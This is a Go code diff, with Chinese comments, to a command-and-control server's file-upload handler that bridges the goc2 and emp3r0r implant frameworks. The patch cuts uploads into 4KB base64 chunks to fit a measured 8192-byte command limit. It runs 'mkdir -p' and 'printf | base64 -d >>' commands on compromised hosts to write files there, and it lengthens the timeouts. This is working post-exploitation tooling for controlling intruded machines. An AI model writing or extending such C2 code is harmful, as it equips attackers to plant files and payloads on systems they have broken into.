@@ -901,17 +901,25 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 	dest = strings.TrimRight(strings.ReplaceAll(dest, "\\", "/"), "/")
 	full := dest + "/" + hdr.Filename
 	// 融合路由：emp3r0r 会话没有 goc2 的 upload 任务类型，用 base64 分块经
-	// run_module exec 落盘（每块 256KB，与 goc2 分块一致，避免命令行过长）。
+	// run_module exec 落盘。两个硬约束（均实测）：
+	//   a) run_module 的 flags 值上限 8192B（actions.go: len(val)>8192 直接拒），
+	//      256KB 的 goc2 粒度完全不可用——实测 5.5KB 命令可过、8KB 被拒，
+	//      故原始块取 4KB（base64 后 5461B + 骨架 < 8192）；
+	//   b) goc2 的 upload 任务会自动建目录，emp3r0r 分支必须自己 mkdir -p。
 	if strings.HasPrefix(agent, emp3r0rIDPrefix) && emp3r0rEnabled() {
 		tag := strings.TrimPrefix(agent, emp3r0rIDPrefix)
 		q := shellQuote(full)
-		const chunk = 256 * 1024
+		if _, err := emp3r0rRunWait(r.Context(), tag, "mkdir -p "+shellQuote(dest), 120*time.Second); err != nil {
+			writeErr(w, 502, "建目录失败: "+err.Error())
+			return
+		}
+		const chunk = 4 * 1024
 		total := (len(data) + chunk - 1) / chunk
 		if total == 0 {
 			writeErr(w, 400, "空文件")
 			return
 		}
-		if _, err := emp3r0rRunWait(r.Context(), tag, ": > "+q, 60*time.Second); err != nil {
+		if _, err := emp3r0rRunWait(r.Context(), tag, ": > "+q, 120*time.Second); err != nil {
 			writeErr(w, 502, "创建失败: "+err.Error())
 			return
 		}
@@ -922,7 +930,7 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 			}
 			b64 := base64.StdEncoding.EncodeToString(data[i*chunk : end])
 			cmd := "printf %s " + shellQuote(b64) + " | base64 -d >> " + q
-			if _, err := emp3r0rRunWait(r.Context(), tag, cmd, 60*time.Second); err != nil {
+			if _, err := emp3r0rRunWait(r.Context(), tag, cmd, 120*time.Second); err != nil {
 				writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
 				return
 			}
